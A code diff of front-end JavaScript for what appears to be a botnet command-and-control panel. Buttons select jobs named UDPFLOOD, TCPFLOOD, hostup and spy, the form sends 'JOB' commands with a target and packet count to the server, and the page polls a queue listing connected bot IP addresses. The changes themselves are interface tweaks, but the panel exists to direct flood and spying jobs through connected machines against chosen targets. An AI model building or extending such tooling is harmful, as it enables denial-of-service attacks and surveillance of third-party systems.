@@ -1,6 +1,6 @@
 function equation() {
 	document.getElementById("equation").onclick = function() {
-		alert("Fields updated!");
+		//alert("Fields updated!");
 		document.getElementById("count").disabled = true;
 		document.getElementById("count").style.display = "none";
 		document.getElementById("submit").style.display = "block";
@@ -11,7 +11,7 @@ function equation() {
 
 function udp() {
 	document.getElementById("udp").onclick = function() {
-		alert("Fields updated!");
+		//alert("Fields updated!");
 		document.getElementById("count").disabled = false;
 		document.getElementById("count").style.display = "block";
 		document.getElementById("submit").style.display = "block";
@@ -23,7 +23,7 @@ function udp() {
 
 function tcp() {
 	document.getElementById("tcp").onclick = function() {
-		alert("Fields updated!");
+		//alert("Fields updated!");
 		document.getElementById("count").disabled = false;
 		document.getElementById("count").style.display = "block";
 		document.getElementById("submit").style.display = "block";
@@ -34,7 +34,7 @@ function tcp() {
 
 function hostup() {
 	document.getElementById("hostup").onclick = function() {
-		alert("Fields updated!");
+		//alert("Fields updated!");
 		document.getElementById("count").disabled = true;
 		document.getElementById("count").style.display = "none";
 		document.getElementById("submit").style.display = "block";
@@ -45,7 +45,7 @@ function hostup() {
 
 function spy() {
 	document.getElementById("spy").onclick = function() {
-		alert("Fields updated!");
+		//alert("Fields updated!");
 		document.getElementById("count").disabled = true;
 		document.getElementById("count").style.display = "none";
 		document.getElementById("target").style.display = "block";
@@ -68,9 +68,13 @@ $("#fieldform").submit(function(e) {
     var form = $(this);
     var url = form.attr('action');
     
-	var jobVal = $(".switch-one:checked").val();
+	var jobVal = $("input[name=switch-one]:checked").val();
 	
-	var formattedData = "JOB" + jobVal + document.getElementById("field").value
+	var x = document.getElementById("field")
+	if (x == null) {
+		x = document.getElementById("target")
+	}
+	var formattedData = "JOB " + jobVal + " " + x.value
 	if(jobVal === "UDPFLOOD" || jobVal === "TCPFLOOD"){
 	  	formattedData += document.getElementById("count").value
 	} 
@@ -78,37 +82,54 @@ $("#fieldform").submit(function(e) {
 	var dataJson = {
 	  	"job": formattedData, 
 	}
+	console.log(dataJson);
 	
 	$.ajax ({
 	  	type: "POST",
 	  	url: url,
-	  	data: JSON.stringify(dataJson),
+	  	data: $("#fieldform").serialize(),
 		success: function(data) {
-	  		alert(data);
+			console.log(data)
+	  		//alert(data);
 		}
 	});
 });
 
-function addConnection() {
-	document.getElementById("connect").innerHTML += '<div class="connections" id=connect><button type="button" class="collapsible">Connection</button><div class="content"><p>Connection:</p></div>';
+function addConnection(data) {
+	var d = JSON.parse(data);
+	var s = "";
+	d['queue'].forEach(ip=> {
+		s += `<button type="button" class="collapsible">${ip}</button>
+<div class="content">
+	<p>Job Result:</p>
+</div>`;
+	});
+	document.getElementById("connect").innerHTML = s;
 }
 
 //queue
+$.get( "/api/queue", function( data ) {
+	console.log(data)
+	addConnection(data);
+});
 setInterval(function(){
 	$.get( "/api/queue", function( data ) {
-		addConnection();
+		console.log(data)
+		addConnection(data);
 	});
 }, 5000);
 
 //Job result
+/*
 setInterval(function(){
 	$.get( "/api/jobResult", function( data ) {
 		var txt = data;
 		var obj = JSON.parse(txt);
 
-		alert(obj.result);
+		//alert(obj.result);
 	});	
 }, 2000);
+*/
 
 //just for collapsable content
 var coll = document.getElementsByClassName("collapsible");
